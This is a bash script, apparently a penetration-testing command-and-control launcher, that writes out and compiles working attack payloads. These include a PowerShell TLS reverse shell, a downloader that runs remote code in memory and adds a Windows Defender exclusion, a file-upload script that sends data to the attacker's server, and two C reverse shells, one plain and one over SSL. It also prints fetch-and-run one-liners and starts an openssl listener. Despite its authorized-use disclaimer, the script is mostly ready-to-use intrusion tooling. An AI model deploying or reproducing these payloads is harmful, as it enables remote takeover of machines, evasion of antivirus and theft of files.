#!/bin/bash
## not for use outside of lawful and authorized penetration testing engagements and educational purposes
## Most of the payloas were created with the use of generative AI, but they were tested by a real live human
## 
## TODO: Upgrade the webserver to transfer over https if possible as well as http


handle_ctrl_c(){
# cleans up the connection when the server is Ctrl+C'd
    echo "Cleaning up..."
    kill $(ps aux | grep "python3.13 ./server.py" | awk '{print $2}' | head -n 1)
}

SERVER_ROOT="uploads"

if [ $(id -un) == "root" ]; then
# if privileged then use the standard ports, may cause issues on webservers
	HTTPSERVERPORT=80;
	ATTACKERPORT=443;
# make sure the following libraries are installed for libssl communication
	sudo apt-get install libssl-dev
else
# if not privileged then use the alternative ports
	ATTACKERPORT=8443
	HTTPSERVERPORT=8080
fi

# if there is a third option then set the domain name to be a default string of
# resources.local

if [[ $3 ]]; then
	LOCAL_DOMAINNAME=$3
else
	LOCAL_DOMAINNAME=resources.local
fi

# check to see if there are commands that were input and assign them accordingly

if [[ $1 && $2 ]]; then 
# utalize the command line options to generate a new powershell script that will be used for command execution
	ATTACKERIP=$1
	TARGETIP=$2


	echo """
\$socket = New-Object Net.Sockets.TcpClient('$1', '$ATTACKERPORT')
\$stream = \$socket.GetStream()
\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))
\$localdomain=HOSTNAME
\$sslStream.AuthenticateAsClient('\$$LOCAL_DOMAINNAME', \$null, \"Tls12\", \$false)
\$writer = new-object System.IO.StreamWriter(\$sslStream)
\$writer.Write('PS ' + (pwd).Path + '> ')
\$writer.flush()
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0)
{\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
\$sendback = (iex \$data | Out-String ) 2>&1;
\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
\$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()}
""" > $SERVER_ROOT/payload.ps1

# download the shell script and create a direcotry that is excluded from virus scans
	echo """
try {
mkdir C:\\Tools\\
} catch {
	write-host \"Tools directory exists\"
}
cd C:\\Tools\\
try{
IEX (New-Object Net.WebClient).DownloadString('http://$ATTACKERIP:$HTTPSERVERPORT/files/payload.ps1')
} catch {
	write-host \"Could not execute in memory from remote script trying to execute on disk\"
}
	Set-ExecutionPolicy Unrestricted 
	Set-MpPreference -ExclusionPath C:\\Tools\\
	Invoke-WebRequest http://$ATTACKERIP:$HTTPSERVERPORT/files/payload.ps1 -OutFile automate.ps1
	./automate.ps1
	write-host \"Could not execute on disk for some reason most likely scripts are disabled\"

Invoke-WebRequest http://$ATTACKERIP:$HTTPSERVERPORT/files/upload.ps1 -OutFile upload.ps1
Remove-MpPreference -ExclusionPath C:\windows\tmp
""" > $SERVER_ROOT/downloader.ps1

## upload script
	echo """
\$filePath = \"\$args\"
write-host \$filePath
\$fileName = Split-Path \$filePath -Leaf
\$boundary = [System.Guid]::NewGuid().ToString()
\$fileBytes = [System.IO.File]::ReadAllBytes(\$filePath)
\$fileContent = [System.Text.Encoding]::GetEncoding(\"iso-8859-1\").GetString(\$fileBytes)

\$bodyLines = @(
    \"--\$boundary\"
    \"Content-Disposition: form-data; name=\`\"file\`\"; filename=\`\"\$fileName\`\"\"
    \"Content-Type: application/octet-stream\"
    \"\"
    \$fileContent
    \"--\$boundary--\"
)

\$body = \$bodyLines -join \"\`r\`n\"

Invoke-RestMethod -Uri 'http://$ATTACKERIP:$HTTPSERVERPORT/upload' -Method Post -ContentType \"multipart/form-data; boundary=\`\"\$boundary\`\"\" -Body \$body   
"""> $SERVER_ROOT/upload.ps1

## TODO: windows executeable encrypted payload generation

echo """
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int main(void){
    int port = $ATTACKERPORT;
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(\"$ATTACKERIP\");
    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));

    // Get and print local IP
    struct sockaddr_in local_addr;
    socklen_t addr_len = sizeof(local_addr);
    getsockname(sockt, (struct sockaddr*)&local_addr, &addr_len);
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &local_addr.sin_addr, ip_str, INET_ADDRSTRLEN);
    char greeting[200];
    snprintf(greeting, sizeof(greeting), \"%s> \", ip_str);
    write(sockt, greeting, strlen(greeting));

    char buffer[1024];
    char prompt[50];
    prompt[0]='\0';
    strcat(prompt,ip_str);
    strcat(prompt,\"> \");

    while(1) {
        int len = read(sockt, buffer, sizeof(buffer) - 1);
        if (len <= 0) break;
        buffer[len] = '\0';
        buffer[strcspn(buffer, \"\n\r\")] = 0;

        if (strcmp(buffer, \"exit\") == 0) break;

        FILE *fp = popen(buffer, \"r\");
        if (fp) {
            while (fgets(buffer, sizeof(buffer), fp)) {
                write(sockt, buffer, strlen(buffer));
            }
            pclose(fp);
        } else {
            write(sockt, \"Error\n\", 6);
        }
        write(sockt, prompt, strlen(prompt));
    }

    close(sockt);
    return 0;       
}   
""" > simple-shell.c
	gcc -static simple-shell.c -o $SERVER_ROOT/simple-payload; strip $SERVER_ROOT/simple-payload;

echo """
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

int main(){
    // Initialize OpenSSL
    SSL_library_init();
    SSL_CTX *ctx = SSL_CTX_new(SSLv23_client_method());
    if (!ctx) exit(1);

    int port = $ATTACKERPORT;
    struct sockaddr_in serv_addr;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr.s_addr = inet_addr(\"$ATTACKERIP\");

    connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

    // Perform SSL handshake
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) != 1) exit(1);

    // Get local IP
    struct sockaddr_in local_addr;
    socklen_t addr_len = sizeof(local_addr);
    getsockname(sock, (struct sockaddr*)&local_addr, &addr_len);
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &local_addr.sin_addr, ip_str, INET_ADDRSTRLEN);
    char greeting[200];
    snprintf(greeting, sizeof(greeting), \"%s> \", ip_str);
    SSL_write(ssl, greeting, strlen(greeting));

    char buffer[1024];
    char prompt[50];
    prompt[0]='\0';
    strcat(prompt,ip_str);
    strcat(prompt,\"> \");

    while(1) {
        int len = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        if (len <= 0) break;
        buffer[len] = '\0';
        buffer[strcspn(buffer, \"\n\r\")] = 0;

        if (strcmp(buffer, \"exit\") == 0) break;

        FILE *fp = popen(buffer, \"r\");
        if (fp) {
            while (fgets(buffer, sizeof(buffer), fp)) {
                SSL_write(ssl, buffer, strlen(buffer));
            }
            pclose(fp);
        }
        SSL_write(ssl, prompt, strlen(prompt));
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    close(sock);
    return 0;
}   

""" > encrypted-payload.c
gcc encrypted-payload.c -lssl -lcrypto -o $SERVER_ROOT/encrypted-payload; strip $SERVER_ROOT/encrypted-payload



## Help yourself out by printing possible execution methods
	echo ""
	echo ""
	echo "Next Steps"
	echo "To Execute a file inline"
	echo "IEX (New-Object Net.WebClient).DownloadString('http://$ATTACKERIP/files/<payload.ps1>')"
	echo "To Download a file to the target machine"
	echo "Invoke-WebRequest -Uri \"http://$ATTACKERIP/files/<source>\" -OutFile \"<dest>\""
	echo "To Upload a file to the local server"
	echo "Invoke-RestMethod -Uri http://$ATTACKERIP/upload/ -Method Post -InFile <local-file> -UseDefaultCredentials"
	echo "To start the encrypted c2 channel in linux"
	echo "wget http://$ATTACKERIP/files/encrypted-payload; ./encrypted-payload"
	echo "To start the standard c2 channel in linux"
	echo "wget http://$ATTACKERIP/files/simple-payload; ./simple-payload"
	echo "Available payloads:"
	for i in $(ls ./uploads); do echo $i; done


else 
	echo ""
	echo "Usage:"
	echo "./start.sh <attacker-ip> <target-ip> <domain-name>"
	echo "the attacker and target ip's are required and the doamin name"
	echo "is optional however it will help with changing signatures."
	echo ""
fi;

	## make sure there is not server currently running
	ps aux | grep "python3.13 ./server.py" | awk '{print $2}' | head -n 1
	# run the server
	python3.13 ./server.py 2> server.log &
	## set trap after starting server
	trap handle_ctrl_c INT
	# generate keys if they do not exist
	if [[ -f ./key.pem && -f ./cert.pem ]]; then
		echo "Using existing keypair"
	else
		openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj /C=US/ST=WA/L=Seattle/O=Widgets/OU=IT/CN=$LOCAL_DOMAINNAME
	fi	
# commented out for debugging
#	rm key.pem
#	rm cert.pem
	# start the ssl listener in order to encrypt tracfic

	echo "wait for an incoming connection"
	openssl s_server -quiet -key key.pem -cert cert.pem -port $ATTACKERPORT



